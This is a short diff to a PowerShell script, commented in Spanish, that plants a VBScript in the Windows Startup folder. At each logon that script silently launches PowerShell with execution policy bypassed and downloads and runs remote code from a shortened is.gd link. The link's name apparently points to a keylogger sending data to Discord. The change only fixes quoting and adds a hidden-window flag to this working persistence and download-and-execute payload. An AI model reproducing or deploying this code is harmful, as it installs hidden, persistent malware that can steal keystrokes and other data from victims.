@@ -6,9 +6,9 @@ if ($dc.Length -ne 121) {
 
 # Crear el archivo de inicio
 $startupFilePath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\init.txt"
-$wshShellCreation = "Set WshShell = WScript.CreateObject(`"WScript.Shell`")"
+$wshShellCreation = "Set WshShell = WScript.CreateObject('WScript.Shell')"
 $wshShellCreation | Out-File -FilePath $startupFilePath -Force
-$wshShellRun = "WshShell.Run `"powershell.exe -NoP -Ep Bypass -W H -C `$dc=`"$dc`"; irm https://is.gd/bw_kl_to_dc | iex`", 0, True"
+$wshShellRun = "WshShell.Run 'powershell.exe -WindowStyle Hidden -NoP -Ep Bypass -W H -C `$dc=`"`$dc`"; irm https://is.gd/bw_kl_to_dc | iex'", 0, True"
 $wshShellRun | Out-File -FilePath $startupFilePath -Append -Force
 Rename-Item -Path $startupFilePath -NewName "init.vbs" -Force
 
